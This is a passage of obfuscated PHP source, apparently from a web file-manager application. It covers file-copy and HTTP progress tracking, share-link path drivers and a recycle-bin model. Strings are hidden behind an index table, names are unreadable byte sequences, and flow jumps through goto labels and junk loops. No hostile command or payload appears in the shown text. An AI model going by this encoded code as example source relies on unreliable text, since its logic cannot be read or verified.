$‡ËÓš¤¶[$ÌºŞ³”¸[1728]] == $ÌºŞ³”¸[117]) { if ($‡ËÓš¤¶[$ÌºŞ³”¸[1722]]) { $‡ËÓš¤¶[$ÌºŞ³”¸[1725]] = $‡ËÓš¤¶[$ÌºŞ³”¸[1724]] + $‡ËÓš¤¶[$ÌºŞ³”¸[1721]]; } } else { if ($‡ËÓš¤¶[$ÌºŞ³”¸[1728]] == $ÌºŞ³”¸[1341]) { if ($‡ËÓš¤¶[$ÌºŞ³”¸[1722]] == $ÌºŞ³”¸[1219]) { $‡ËÓš¤¶[$ÌºŞ³”¸[1725]] = $‡ËÓš¤¶[$ÌºŞ³”¸[1724]] + $‡ËÓš¤¶[$ÌºŞ³”¸[1721]] * 0.5; } else { if ($‡ËÓš¤¶[$ÌºŞ³”¸[1722]] == $ÌºŞ³”¸[117]) { $‡ËÓš¤¶[$ÌºŞ³”¸[1725]] = $‡ËÓš¤¶[$ÌºŞ³”¸[1724]] + $‡ËÓš¤¶[$ÌºŞ³”¸[1720]] * 0.5 + $‡ËÓš¤¶[$ÌºŞ³”¸[1721]] * 0.5; } } } } $‡ËÓš¤¶[$ÌºŞ³”¸[1669]] = $‡ËÓš¤¶[$ÌºŞ³”¸[1725]] / $‡ËÓš¤¶[$ÌºŞ³”¸[791]]; if ($‡ËÓš¤¶[$ÌºŞ³”¸[1669]] > 0) { $±ú€şòø = timeFloat() - $‡ËÓš¤¶[$ÌºŞ³”¸[1671]] - $‡ËÓš¤¶[$ÌºŞ³”¸[1674]]; $‡ËÓš¤¶[$ÌºŞ³”¸[1675]] = $±ú€şòø * (1 - $‡ËÓš¤¶[$ÌºŞ³”¸[1669]]) / $‡ËÓš¤¶[$ÌºŞ³”¸[1669]]; } } public function addPath($Û®É ˜) { $À™Ö£ŠÕ =& $_SERVER[ªÏ§Ë·]; if (!$Û®É ˜) { return; } $ßàÃó´Û =& $this->task; $ªœºÆ¡ë = IO::infoWithChildren($Û®É ˜); $·“¶ŒÃ = $ßàÃó´Û[$À™Ö£ŠÕ[1729]] ? $ßàÃó´Û[$À™Ö£ŠÕ[1729]][$À™Ö£ŠÕ[1730]] : 0; $ßàÃó´Û[$À™Ö£ŠÕ[1729]] = array($À™Ö£ŠÕ[1730] => $·“¶ŒÃ + 1, $À™Ö£ŠÕ[458] => $ªœºÆ¡ë[$À™Ö£ŠÕ[42]], $À™Ö£ŠÕ[94] => $ªœºÆ¡ë[$À™Ö£ŠÕ[94]], $À™Ö£ŠÕ[547] => $ªœºÆ¡ë[$À™Ö£ŠÕ[547]] ? $ªœºÆ¡ë[$À™Ö£ŠÕ[547]] : $ªœºÆ¡ë[$À™Ö£ŠÕ[94]]); if ($ªœºÆ¡ë[$À™Ö£ŠÕ[43]] == $À™Ö£ŠÕ[210]) { $ßàÃó´Û[$À™Ö£ŠÕ[814]] += 1; } else { $ßàÃó´Û[$À™Ö£ŠÕ[814]] += $ªœºÆ¡ë[$À™Ö£ŠÕ[89]][$À™Ö£ŠÕ[87]]; if ($ªœºÆ¡ë[$À™Ö£ŠÕ[440]]) { $ßàÃó´Û[$À™Ö£ŠÕ[814]] += $ªœºÆ¡ë[$À™Ö£ŠÕ[89]][$À™Ö£ŠÕ[88]] + 1; } } $ßàÃó´Û[$À™Ö£ŠÕ[791]] += $ªœºÆ¡ë[$À™Ö£ŠÕ[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Øõß¦öá) { } public function sourceAddHashEnd($“ƒå–¤š) { } public function sourceAddFileStart($˜ÇĞ½ˆì) { $í¡™·‘ =& $_SERVER[ªÏ§Ë·]; $Èé“‡ü´ =& $this->task; $Èé“‡ü´[$í¡™·‘[1720]] = $˜ÇĞ½ˆì[$í¡™·‘[86]]; $Èé“‡ü´[$í¡™·‘[1718]] = $˜ÇĞ½ˆì[$í¡™·‘[42]]; $Èé“‡ü´[$í¡™·‘[1089]] = $˜ÇĞ½ˆì[$í¡™·‘[42]]; $Èé“‡ü´[$í¡™·‘[1731]] = $˜ÇĞ½ˆì[$í¡™·‘[94]]; $this->update(); } public function sourceAddFileEnd($î«¾£¾Ö) { $¼òÊ¶¬ =& $_SERVER[ªÏ§Ë·]; $›ŠÔãš =& $this->task; $›ŠÔãš[$¼òÊ¶¬[1725]] += $î«¾£¾Ö[$¼òÊ¶¬[86]]; $›ŠÔãš[$¼òÊ¶¬[1731]] = $î«¾£¾Ö[$¼òÊ¶¬[94]]; $this->update(1); } public function copyFileStart($¦¢îæÔÁ, $ÜÏæôñ, $¼„‹È‹û, $÷ÒÏù¿, $˜œƒ¥àü, $Î½ İßÃ) { $æ®ë—ÃÁ =& $_SERVER[ªÏ§Ë·]; $Ï±í™ßÃ = $˜œƒ¥àü; if ($Ï±í™ßÃ == $GLOBALS[$æ®ë—ÃÁ[1732]]) { $Ï±í™ßÃ = $GLOBALS[$æ®ë—ÃÁ[1733]]; } $GLOBALS[$æ®ë—ÃÁ[1733]] = $˜œƒ¥àü; $GLOBALS[$æ®ë—ÃÁ[1732]] = $Î½ İßÃ; $×“ô×êÁ =& $this->task; $×“ô×êÁ[$æ®ë—ÃÁ[1718]] = $Ï±í™ßÃ; $×“ô×êÁ[$æ®ë—ÃÁ[1720]] = (int) $¦¢îæÔÁ->size($ÜÏæôñ); $×“ô×êÁ[$æ®ë—ÃÁ[1721]] = 0; $×“ô×êÁ[$æ®ë—ÃÁ[1089]] = $æ®ë—ÃÁ[12]; $×“ô×êÁ[$æ®ë—ÃÁ[1722]] = $æ®ë—ÃÁ[12]; $×“ô×êÁ[$æ®ë—ÃÁ[1723]] = 0; $Ùñ‡Õš = $×“ô×êÁ[$æ®ë—ÃÁ[1720]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($×“ô×êÁ[$æ®ë—ÃÁ[437]] . $æ®ë—ÃÁ[1734]); if ($Ùñ‡Õš && file_exists(get_path_father($÷ÒÏù¿))) { Cache::set($×“ô×êÁ[$æ®ë—ÃÁ[437]] . $æ®ë—ÃÁ[1734], $÷ÒÏù¿); $×“ô×êÁ[$æ®ë—ÃÁ[1691]] = array($æ®ë—ÃÁ[1735], $æ®ë—ÃÁ[1736]); } $this->update(0, $Ùñ‡Õš); } public static function updateCopyLocalFileSize($Úç…¸¿†) { $ÛŸ¢›±Ñ =& $_SERVER[ªÏ§Ë·]; $Ä±®«ß = Cache::get($Úç…¸¿†[$ÛŸ¢›±Ñ[437]] . $ÛŸ¢›±Ñ[1734]); if (!$Ä±®«ß || !file_exists($Ä±®«ß)) { return $Úç…¸¿†; } $Úç…¸¿†[$ÛŸ¢›±Ñ[1721]] = @filesize($Ä±®«ß); $Úç…¸¿†[$ÛŸ¢›±Ñ[1725]] += $Úç…¸¿†[$ÛŸ¢›±Ñ[1721]]; self::updateTask($Úç…¸¿†); return $Úç…¸¿†; } public function copyFileEnd($Ş¢ıÆ•µ, $éú ±…—, $öèùåóù, $³§ïåå, $ğÑ’€š¢, $şæàŞİ©) { $’Òõ  =& $_SERVER[ªÏ§Ë·]; $µæ•¸ =& $this->task; $µæ•¸[$’Òõ [1721]] = $µæ•¸[$’Òõ [1720]]; $µæ•¸[$’Òõ [1722]] = $’Òõ [12]; unset($µæ•¸[$’Òõ [1691]]); if ($ğÑ’€š¢ == $µæ•¸[$’Òõ [1718]]) { $µæ•¸[$’Òõ [1724]] += $µæ•¸[$’Òõ [1720]]; $µæ•¸[$’Òõ [1725]] = $µæ•¸[$’Òõ [1724]]; $Ü‹½ŒÏó = 1; if (isset($µæ•¸[$’Òõ [1731]]) && $µæ•¸[$’Òõ [1731]] == $éú ±…—) { $Ü‹½ŒÏó = 0; } $this->update($Ü‹½ŒÏó); } else { $this->update(); $µæ•¸[$’Òõ [1721]] = 0; } Cache::remove($µæ•¸[$’Òõ [437]] . $’Òõ [1734]); self::log($’Òõ [1737] . $éú ±…— . $’Òõ [80] . $³§ïåå . $’Òõ [19] . $ğÑ’€š¢ . $’Òõ [1738] . $µæ•¸[$’Òõ [1718]]); } public function updateFileEnd($¨‘õ›Ì¥, $ğïµÉ„²) { $ÊÂª£¹î =& $_SERVER[ªÏ§Ë·]; $ëÙÀùÃ =& $this->task; $ëÙÀùÃ[$ÊÂª£¹î[1718]] = $¨‘õ›Ì¥; $ëÙÀùÃ[$ÊÂª£¹î[1720]] = $ğïµÉ„²; $ëÙÀùÃ[$ÊÂª£¹î[1724]] += $ğïµÉ„²; $ëÙÀùÃ[$ÊÂª£¹î[1725]] = $ëÙÀùÃ[$ÊÂª£¹î[1724]]; $this->update(1); self::log($ÊÂª£¹î[1739] . $¨‘õ›Ì¥); } public function sourceModelCopy($¼÷Çî®Ù) { $¿ˆÛëø =& $_SERVER[ªÏ§Ë·]; $¨˜›¸ÅŸ = $¼÷Çî®Ù[0]; $‡œ¶Îµí = $¼÷Çî®Ù[1]; $Øáû¿±ƒ =& $this->task; $this->sourceModelCopyFlag = !0; $¾œ§ş÷á = 0; switch ($¨˜›¸ÅŸ) { case $¿ˆÛëø[601]: $¾œ§ş÷á = 1; break; case $¿ˆÛëø[604]: $Øáû¿±ƒ[$¿ˆÛëø[1718]] = $‡œ¶Îµí[$¿ˆÛëø[42]]; break; case $¿ˆÛëø[606]: $¾œ§ş÷á = intval($¼÷Çî®Ù[$¿ˆÛëø[418]] * 0.4); break; case $¿ˆÛëø[608]: $¾œ§ş÷á = intval($¼÷Çî®Ù[$¿ˆÛëø[418]] * 0.2); break; case $¿ˆÛëø[610]: $¾œ§ş÷á = intval($¼÷Çî®Ù[$¿ˆÛëø[418]] * 0.4); break; } $this->update($¾œ§ş÷á); $this->sourceModelCopyFlag = !1; } public function sourceRemove($à†õğ¸š, $­ğÅÈ¨¼) { $Ã¹”ç…œ =& $_SERVER[ªÏ§Ë·]; $this->sourceModelCopyFlag = !0; $Ş²± ÉÍ = 1; if (isset($à†õğ¸š[$Ã¹”ç…œ[89]])) { $Ş²± ÉÍ = $à†õğ¸š[$Ã¹”ç…œ[89]][$Ã¹”ç…œ[87]]; $Ş²± ÉÍ = $Ş²± ÉÍ + $à†õğ¸š[$Ã¹”ç…œ[89]][$Ã¹”ç…œ[88]] + 1; } $this->update($Ş²± ÉÍ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ğÑ´ÂÏ¢) { $this->sourceRemove($ğÑ´ÂÏ¢, !1); } public function curlProgress($Şîøšçé, $Ö¤õÈòô, $ĞúÌæ, $ß¾‹éØĞ, $Ñ†ˆ“ê—) { $²¡Ïá‘Æ =& $_SERVER[ªÏ§Ë·]; $¥É„ƒƒè =& $this->task; if ($Ñ†ˆ“ê— > 0) { $¥É„ƒƒè[$²¡Ïá‘Æ[1089]] = $²¡Ïá‘Æ[1740]; $¥É„ƒƒè[$²¡Ïá‘Æ[1722]] = $²¡Ïá‘Æ[117]; if ($¥É„ƒƒè[$²¡Ïá‘Æ[1720]]) { $¥É„ƒƒè[$²¡Ïá‘Æ[1721]] = $Ñ†ˆ“ê—; } if ($¥É„ƒƒè[$²¡Ïá‘Æ[1723]]) { $¥É„ƒƒè[$²¡Ïá‘Æ[1721]] = $Ñ†ˆ“ê— + $¥É„ƒƒè[$²¡Ïá‘Æ[1723]]; } } else { if ($ĞúÌæ > 0) { if ($¥É„ƒƒè[$²¡Ïá‘Æ[1720]] == $Ö¤õÈòô) { $¥É„ƒƒè[$²¡Ïá‘Æ[1721]] = $ĞúÌæ; $¥É„ƒƒè[$²¡Ïá‘Æ[1089]] = $²¡Ïá‘Æ[1741]; $¥É„ƒƒè[$²¡Ïá‘Æ[1722]] = $²¡Ïá‘Æ[1219]; } } } $this->update(); } public function curlProgressStart($Ş“¢Ñ) { } public function curlProgressEnd($“ªü§ëÊ) { $Ô«é÷ÂØ =& $_SERVER[ªÏ§Ë·]; $ÛÒµø‡É =& $this->task; $ºÉŒÀáÑ = curl_getinfo($“ªü§ëÊ); $öõÁ°µĞ = $ºÉŒÀáÑ[$Ô«é÷ÂØ[1742]]; if ($öõÁ°µĞ == -1) { $öõÁ°µĞ = $ºÉŒÀáÑ[$Ô«é÷ÂØ[1743]]; } if ($ÛÒµø‡É[$Ô«é÷ÂØ[1722]] == $Ô«é÷ÂØ[117] && $öõÁ°µĞ) { $ÛÒµø‡É[$Ô«é÷ÂØ[1723]] += $öõÁ°µĞ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ü©¥ =& $_SERVER[ªÏ§Ë·]; $ğßùÒğ§ =& $this->task; $ğßùÒğ§[$ü©¥[1744]] = 1; Hook::bind($ü©¥[1712], array($this, $ü©¥[1745])); Hook::bind($ü©¥[1714], array($this, $ü©¥[1746])); Hook::bind($ü©¥[1716], array($this, $ü©¥[1747])); } protected function endAfter() { $••ë†½ =& $_SERVER[ªÏ§Ë·]; Hook::unbind($••ë†½[1712], array($this, $••ë†½[1745])); Hook::unbind($••ë†½[1714], array($this, $••ë†½[1746])); Hook::unbind($••ë†½[1716], array($this, $••ë†½[1747])); } public function progressStart($°µ×ñ¬‚) { $ÀçÔî =& $_SERVER[ªÏ§Ë·]; $­£ç§¼ç = curl_getinfo($°µ×ñ¬‚); self::log($ÀçÔî[1748] . $­£ç§¼ç[$ÀçÔî[345]]); self::valueSet($this->task[$ÀçÔî[437]], $this->task); } public function progressEnd($¶ê‹ËÃâ) { $äë‡´Â =& $_SERVER[ªÏ§Ë·]; self::log($äë‡´Â[1749] . $this->task[$äë‡´Â[437]]); $this->end(); } public function progress($ôß¶‚ûí, $„ç¯´æ°, $±ËºÄÑÍ, $»ş“æ‚«, $„ê‹ŸØ¸) { $Ìç«¦Ú =& $_SERVER[ªÏ§Ë·]; $¡’à‹°ğ =& $this->task; if ($„ê‹ŸØ¸ > 0) { $¡’à‹°ğ[$Ìç«¦Ú[814]] = $¡’à‹°ğ[$Ìç«¦Ú[814]] == 0 ? $»ş“æ‚« : $¡’à‹°ğ[$Ìç«¦Ú[814]]; $¡’à‹°ğ[$Ìç«¦Ú[1668]] = $„ê‹ŸØ¸; } else { if ($±ËºÄÑÍ > 0) { $¡’à‹°ğ[$Ìç«¦Ú[814]] = $¡’à‹°ğ[$Ìç«¦Ú[814]] == 0 ? $„ç¯´æ° : $¡’à‹°ğ[$Ìç«¦Ú[814]]; $¡’à‹°ğ[$Ìç«¦Ú[1668]] = $±ËºÄÑÍ; } } $this->update(); self::log("\160\162\157\147\x72\x65\163\x73\110\164\x74\160\x3a\x64\157\x77\x6e\x3a{$±ËºÄÑÍ}\x2f{$„ç¯´æ°}\x3b\40\x75\160\154\x6f\x61\x64\x3a{$„ê‹ŸØ¸}\x2f{$»ş“æ‚«}\x3b"); } } goto FŒæÎŒ›‹; cÄ¡¬ì‡ÀÜ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÎãÕ€ÃÚ) { $this->pathParse = $ÎãÕ€ÃÚ; $this->model = Model($_SERVER[ªÏ§Ë·][1358]); } protected function infoParse($èÄƒÑšü, $Å¸ˆßô“ = false, $‰şŒ‰ = false) { $‘¥‹‡Ì =& $_SERVER[ªÏ§Ë·]; return Action($‘¥‹‡Ì[1199])->sharePathInfo($this->pathParse[$‘¥‹‡Ì[94]], !0, $Å¸ˆßô“); } public function listPath($ˆÜÉ¯Ë¿, $‹ Ë¼Š¤ = false) { $ºÅİ—Ô =& $_SERVER[ªÏ§Ë·]; $Æá×îÉ = parent::listPath($ˆÜÉ¯Ë¿, $‹ Ë¼Š¤); if (!$Æá×îÉ) { return $Æá×îÉ; } if (is_array($Æá×îÉ[$ºÅİ—Ô[1367]])) { $Æá×îÉ[$ºÅİ—Ô[1367]] = Action($ºÅİ—Ô[1199])->shareItemInfo($Æá×îÉ[$ºÅİ—Ô[1367]]); } foreach ($Æá×îÉ as $¤İ æš– => $£ãò§‘À) { if (!in_array($¤İ æš–, array($ºÅİ—Ô[93], $ºÅİ—Ô[92]))) { continue; } foreach ($£ãò§‘À as $‡Æ½¸ => $‹ß°„ô®) { $Æá×îÉ[$¤İ æš–][$‡Æ½¸] = Action($ºÅİ—Ô[1199])->shareItemInfo($‹ß°„ô®); } } return $Æá×îÉ; } public function listAll($§’¿ó¥î) { $Æ€‘ğô =& $_SERVER[ªÏ§Ë·]; $­½Àñ” = IO::info($this->pathParse[$Æ€‘ğô[94]]); if (!$­½Àñ”) { return array(); } $ä›ÂóÃ = $this->model->listAll($§’¿ó¥î); foreach ($ä›ÂóÃ as &$ÁÆ°¢Òº) { $ÁÆ°¢Òº[$Æ€‘ğô[97]] = Action($Æ€‘ğô[1199])->shareItemInfo($ÁÆ°¢Òº[$Æ€‘ğô[97]]); } unset($ÁÆ°¢Òº); return $ä›ÂóÃ; } } class PathDriverDriverShareItem { public function __construct($¢Î„¤²) { $this->pathParse = $¢Î„¤²; } public function __call($ËÒ¢ûæ, $£û‰ÁÑŸ) { $ÎöáÙúç =& $_SERVER[ªÏ§Ë·]; if (method_exists($this, $ËÒ¢ûæ)) { return; } $ƒêÓ€¨§ = call_user_func_array(array($ÎöáÙúç[1368], $ËÒ¢ûæ), $£û‰ÁÑŸ); $ªºŒîğ£ = array($ÎöáÙúç[1369], $ÎöáÙúç[1370], $ÎöáÙúç[1371], $ÎöáÙúç[1372], $ÎöáÙúç[584], $ÎöáÙúç[586], $ÎöáÙúç[1373], $ÎöáÙúç[117], $ÎöáÙúç[1374], $ÎöáÙúç[1375]); if (in_array($ËÒ¢ûæ, $ªºŒîğ£)) { $ƒêÓ€¨§ = $this->getPathOuter($ƒêÓ€¨§); } return $ƒêÓ€¨§; } public function copy($¡ŠŞĞŒ„, $ÌÚğ£†, $›ÜÜ’Õ’ = false, $Ğõó“ŒË = false) { return $this->copyMove($¡ŠŞĞŒ„, $ÌÚğ£†, $›ÜÜ’Õ’, $_SERVER[ªÏ§Ë·][584], $Ğõó“ŒË); } public function move($‚ôÃ€İ, $Ç›Äü±, $Ëùñ“ûÂ = false, $ïÈ¿ı›ö = false) { return $this->copyMove($‚ôÃ€İ, $Ç›Äü±, $Ëùñ“ûÂ, $_SERVER[ªÏ§Ë·][586], $ïÈ¿ı›ö); } private function copyMove($ëÒ©›‘ú, $ÅÃÖşê…, $Ÿ‹åµİÁ, $–›ä˜ü¬, $»“¢òÊ = false) { $æåû“øş =& $_SERVER[ªÏ§Ë·]; $ÛîíÏ‘õ = $ÅÃÖşê…; $ˆ³Ï İ = IO::driverMake($ÅÃÖşê…); if ($ˆ³Ï İ->pathParse[$æåû“øş[1176]]) { $ÅÃÖşê… = $ˆ³Ï İ->pathParse[$æåû“øş[1176]]; } else { $ÅÃÖşê… = $ÛîíÏ‘õ; } $ÂÂÒ©¨¡ = IO::copyMove($ëÒ©›‘ú, $ÅÃÖşê…, $Ÿ‹åµİÁ, $–›ä˜ü¬, $»“¢òÊ); $ÂÂÒ©¨¡ = $this->getPathOuter($ÂÂÒ©¨¡); return $ÂÂÒ©¨¡; } public function pathThis($¹üà¨æ‘) { return get_path_this($this->pathParse[$_SERVER[ªÏ§Ë·][94]]); } public function pathFather($Ğè»…ƒ) { return get_path_father($this->pathParse[$_SERVER[ªÏ§Ë·][94]]); } public function iconvSystem($Ğ‘“â´á) { return $Ğ‘“â´á; } protected function infoParse($ ×®³ã, $«¯ä›±Ã = false) { $­ñê“¾ñ =& $_SERVER[ªÏ§Ë·]; $ß˜•ç‰¬ = $this->pathParse[$­ñê“¾ñ[524]][$­ñê“¾ñ[1200]] . $this->pathParse[$­ñê“¾ñ[1193]]; if ($«¯ä›±Ã) { $éØÃÉ¿° = IO::infoWithChildren($ß˜•ç‰¬); } else { $éØÃÉ¿° = IO::info($ß˜•ç‰¬); } $›Œª¦´ = $this->pathParse[$­ñê“¾ñ[524]]; return Action($­ñê“¾ñ[1366])->_shareItemeParse($éØÃÉ¿°, $›Œª¦´); } public function listAll($¢ÍÖ…¿Ş) { $ğë­¨Ïİ =& $_SERVER[ªÏ§Ë·]; $ø©á©Ï’ = IO::listAll($¢ÍÖ…¿Ş); $£‡âı˜­ = rtrim($this->pathParse[$ğë­¨Ïİ[524]][$ğë­¨Ïİ[1200]], $ğë­¨Ïİ[8]); foreach ($ø©á©Ï’ as &$ÇåŠ•œà) { $ÇåŠ•œà[$ğë­¨Ïİ[94]] = $this->pathDriver . $ğë­¨Ïİ[8] . ltrim(substr($ÇåŠ•œà[$ğë­¨Ïİ[94]], strlen($£‡âı˜­)), $ğë­¨Ïİ[8]); } unset($ÇåŠ•œà); return $ø©á©Ï’; } public function listAllSimple($öÍİ÷ì, $˜’óÄ = false) { $³òÊì¥½ =& $_SERVER[ªÏ§Ë·]; $ëÏÁ–‹ = $this->listAll($öÍİ÷ì); $éÆÇÁ§Í = $this->pathParse[$³òÊì¥½[459]]; if (trim($éÆÇÁ§Í, $³òÊì¥½[8]) == trim(get_path_father($éÆÇÁ§Í), $³òÊì¥½[8])) { $˜’óÄ = !0; } return IO::init($³òÊì¥½[12])->listAllSimpleMake($ëÏÁ–‹, $éÆÇÁ§Í, $˜’óÄ); } public function getPathOuter($–ºÜ®Ì) { $ÔÓë¦· =& $_SERVER[ªÏ§Ë·]; $ŞƒèÜø» = KodIO::parse($–ºÜ®Ì); if ($ŞƒèÜø»[$ÔÓë¦·[43]] == KodIO::KOD_SHARE_ITEM) { return $ŞƒèÜø»[$ÔÓë¦·[94]]; } $ãï‚®¿Â = KodIO::clear($–ºÜ®Ì); $Äù¦ğ¥ = KodIO::clear($this->pathParse[$ÔÓë¦·[524]][$ÔÓë¦·[1200]]); $¯·Ú™ïñ = substr($ãï‚®¿Â, strlen($Äù¦ğ¥)); if (substr($ãï‚®¿Â, 0, strlen($Äù¦ğ¥)) != $Äù¦ğ¥) { return !1; } return $this->pathParse[$ÔÓë¦·[1194]] . $ÔÓë¦·[8] . ltrim($¯·Ú™ïñ, $ÔÓë¦·[8]); } public function getType() { $·®ğÇÇº =& $_SERVER[ªÏ§Ë·]; $‘‹ÕĞèˆ = str_replace($·®ğÇÇº[84], $·®ğÇÇº[12], get_class($this)); return strtolower($‘‹ÕĞèˆ); } public function isTypeObject($ÃÑƒ±ƒò) { return IO::isTypeObject($ÃÑƒ±ƒò); } public function info($èŒŸïÚï) { return $this->infoParse($èŒŸïÚï); } public function infoAuth($ øäü©ã) { return $this->infoParse($ øäü©ã); } public function infoWithChildren($±Ì¨û³) { return $this->infoParse($±Ì¨û³, !0); } public function infoFull($Îø´†©Ø) { return $this->infoParse($Îø´†©Ø); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ øøÂÂ´) { $this->pathParse = $ øøÂÂ´; } protected function infoParse($áÊıúáº, $•…¤…Òó = false) { $›ÉÕ­¢ğ =& $_SERVER[ªÏ§Ë·]; return Action($›ÉÕ­¢ğ[1199])->sharePathInfo($this->pathParse[$›ÉÕ­¢ğ[94]], !0, $•…¤…Òó); } public function listPath($–¾í©ô³, $öŞ£Í‰Î = false) { $Š—‡ªÑî =& $_SERVER[ªÏ§Ë·]; $á¼•”¹Œ = IO::listPath($–¾í©ô³, $öŞ£Í‰Î); if (!$á¼•”¹Œ) { return $á¼•”¹Œ; } if (is_array($á¼•”¹Œ[$Š—‡ªÑî[1367]])) { $À—üºº = Action($Š—‡ªÑî[1376])->parsePathChildren($á¼•”¹Œ[$Š—‡ªÑî[1367]], array($Š—‡ªÑî[459] => $–¾í©ô³)); $á¼•”¹Œ[$Š—‡ªÑî[1367]] = Action($Š—‡ªÑî[1199])->shareItemInfo($À—üºº); } foreach ($á¼•”¹Œ as $ëç¦ÑÈ => $ìÃöçïÌ) { if (!in_array($ëç¦ÑÈ, array($Š—‡ªÑî[93], $Š—‡ªÑî[92]))) { continue; } foreach ($ìÃöçïÌ as $ë»¾Ú¦ => $À—üºº) { $À—üºº = Action($Š—‡ªÑî[1376])->parsePathChildren($À—üºº, array($Š—‡ªÑî[459] => $–¾í©ô³)); $á¼•”¹Œ[$ëç¦ÑÈ][$ë»¾Ú¦] = Action($Š—‡ªÑî[1199])->shareItemInfo($À—üºº); } } return $á¼•”¹Œ; } } goto b”ÊŞÁ‚‘; EÁğ‰”¸Â: define($_SERVER[ªÏ§Ë·][642], $_SERVER[ªÏ§Ë·][643]); $pwbrzolfie = $_SERVER[ªÏ§Ë·][644]; while ($pwbrzolfie < $_SERVER[ªÏ§Ë·][645]) { if ($pwbrzolfie >= 0) { break; } $pwbrzolfie++; } goto D•¬ĞÛÓ“; Bİ¡„ùŞµ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\x65\x5f\162\x65\143\x79\x63\154\145"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\x69\x6d\x65", "\164\x69\155\145", "\151\156\163\x65\x72\164", "\146\165\156\x63\x74\x69\157\156")); public function listData($Îğé‡øè = false) { $Ô˜éó½ =& $_SERVER[ªÏ§Ë·]; $Îğé‡øè = $Îğé‡øè ? $Îğé‡øè : USER_ID; $¨ÑººÀ¶ = $this->where(array($Ô˜éó½[1658] => $Îğé‡øè))->select(); return array_to_keyvalue($¨ÑººÀ¶, $Ô˜éó½[12], $Ô˜éó½[440]); } public function moveToRecycle($ààêœÑñ) { $ïœ‹²€ =& $_SERVER[ªÏ§Ë·]; $¯¶Ş†¿ï = Model($ïœ‹²€[1358]); $÷³¶¨ïè = $¯¶Ş†¿ï->sourceInfo($ààêœÑñ); if (!$÷³¶¨ïè || $÷³¶¨ïè[$ïœ‹²€[469]] == $ïœ‹²€[98]) { return; } $µ¶Ô×İû = array($ïœ‹²€[455] => $ààêœÑñ, $ïœ‹²€[1658] => USER_ID, $ïœ‹²€[614] => $÷³¶¨ïè[$ïœ‹²€[449]], $ïœ‹²€[615] => $÷³¶¨ïè[$ïœ‹²€[534]], $ïœ‹²€[618] => $÷³¶¨ïè[$ïœ‹²€[549]]); $this->add($µ¶Ô×İû); $this->recycleMove($ààêœÑñ, 1); if ($÷³¶¨ïè[$ïœ‹²€[448]] == $ïœ‹²€[98]) { $Ëâ€Œâ = array($ïœ‹²€[618] => array($ïœ‹²€[578], $÷³¶¨ïè[$ïœ‹²€[549]] . $ààêœÑñ . $ïœ‹²€[579])); $¯¶Ş†¿ï->where($Ëâ€Œâ)->setField($ïœ‹²€[469], 1); } } public function clear() { $this->remove(!1); } public function remove($§Í€Ç¸ê = false, $Òñ®¸¢Œ = false) { $Èö¿ìÒ =& $_SERVER[ªÏ§Ë·]; $Òñ®¸¢Œ = $Òñ®¸¢Œ ? $Òñ®¸¢Œ : USER_ID; $‡±íÇŒĞ = Model($Èö¿ìÒ[1358]); $îã´¾ = $this->listData($Òñ®¸¢Œ); $§Í€Ç¸ê = $§Í€Ç¸ê === !1 ? !1 : $§Í€Ç¸ê; $åğ¼»–– = array(); foreach ($îã´¾ as $™Ø›¸î´) { if ($§Í€Ç¸ê != !1 && !in_array($™Ø›¸î´, $§Í€Ç¸ê)) { continue; } $õö‰†«ë = $‡±íÇŒĞ->sourceInfo($™Ø›¸î´); $‡±íÇŒĞ->remove($™Ø›¸î´, !1); $õâæÄ¬é = $õö‰†«ë[$Èö¿ìÒ[449]] . $Èö¿ìÒ[11] . $õö‰†«ë[$Èö¿ìÒ[534]]; $åğ¼»––[$õâæÄ¬é] = array($Èö¿ìÒ[614] => $õö‰†«ë[$Èö¿ìÒ[449]], $Èö¿ìÒ[534] => $õö‰†«ë[$Èö¿ìÒ[534]]); $this->where(array($Èö¿ìÒ[440] => $™Ø›¸î´))->delete(); } foreach ($åğ¼»–– as $Âœ¹ÄÊ) { $‡±íÇŒĞ->targetSpaceUpdate($Âœ¹ÄÊ[$Èö¿ìÒ[449]], $Âœ¹ÄÊ[$Èö¿ìÒ[534]]); } } public function restore($ØãËÈŸ§ = false) { $ÖÛ¾“ = $this->listData(); $this->_restoreSource($ÖÛ¾“, $ØãËÈŸ§); } public function removeUserAll($«Â«ÃÜÁ) { $this->remove(!1, $«Â«ÃÜÁ); } private function _restoreSource($Ï ´›ä, $Ôíá½†ì) { $¸ŸœÏÕû =& $_SERVER[ªÏ§Ë·]; $¾ÈÇ¹¡ü = Model($¸ŸœÏÕû[1358]); $Ôíá½†ì = $Ôíá½†ì == !1 ? !1 : $Ôíá½†ì; if (!$Ï ´›ä) { return !0; } $¥è¡†¹© = array(); foreach ($Ï ´›ä as $Å¶š„Êè) { if ($Ôíá½†ì != !1 && !in_array($Å¶š„Êè, $Ôíá½†ì)) { continue; } $‚ùáÏ­‰ = $¾ÈÇ¹¡ü->sourceInfo($Å¶š„Êè); $ÅˆËµˆÌ = $¾ÈÇ¹¡ü->sourceInfo($‚ùáÏ­‰[$¸ŸœÏÕû[470]]); if ($ÅˆËµˆÌ[$¸ŸœÏÕû[469]] == $¸ŸœÏÕû[98]) { continue; } $¾ÈÇ¹¡ü->lockMoveStart($Å¶š„Êè); $this->recycleMove($Å¶š„Êè, 0); if ($‚ùáÏ­‰[$¸ŸœÏÕû[448]] == $¸ŸœÏÕû[98]) { $Ô›ÒöÀ¨ = array($¸ŸœÏÕû[618] => array($¸ŸœÏÕû[578], $‚ùáÏ­‰[$¸ŸœÏÕû[549]] . $Å¶š„Êè . $¸ŸœÏÕû[579])); $¾ÈÇ¹¡ü->where($Ô›ÒöÀ¨)->setField($¸ŸœÏÕû[469], 0); $this->restoreFolderChildren($Å¶š„Êè, $Ï ´›ä); } $this->where(array($¸ŸœÏÕû[440] => $Å¶š„Êè))->delete(); $¾ÈÇ¹¡ü->folderSizeReset($‚ùáÏ­‰[$¸ŸœÏÕû[470]]); $¥è¡†¹©[] = $‚ùáÏ­‰[$¸ŸœÏÕû[470]]; if 